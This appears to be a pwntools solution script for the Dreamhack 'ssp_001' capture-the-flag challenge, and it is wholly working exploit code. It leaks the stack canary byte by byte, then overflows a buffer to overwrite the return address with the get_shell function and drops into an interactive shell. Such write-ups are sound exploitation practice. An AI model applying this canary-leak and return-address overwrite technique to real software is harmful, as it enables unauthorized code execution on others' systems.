from pwn import *

p = process('./ssp_001')
e = ELF('./ssp_001')
#p = remote('host3.dreamhack.games', 19670)

canary = b''
get_shell = e.symbols['get_shell'] # get_shell function address


for i in range(0x83, 0x7f, -1) : # consider little endian
    p.sendafter('> ','P') # read -> use sendafter
    p.sendlineafter(' : ', bytes(str(i),'utf-8')) # scanf -> use sendlineafter
    p.recvuntil(' : ')
    canary += p.recv(2)


canary = int(canary,16)
print('canary : 0x%08x'%canary)

payload = b''
payload += b'A' * 0x40
payload += p32(canary)
payload += b'B'*4 # dummy
payload += b'C'*4 # ebp
payload += p32(get_shell) # ret -> get_shell

p.sendafter('> ', 'E')
p.sendlineafter(' : ', bytes(str(len(payload)),'utf-8')) # name_len -> trigger bof
p.sendafter(' : ',payload)
p.interactive()
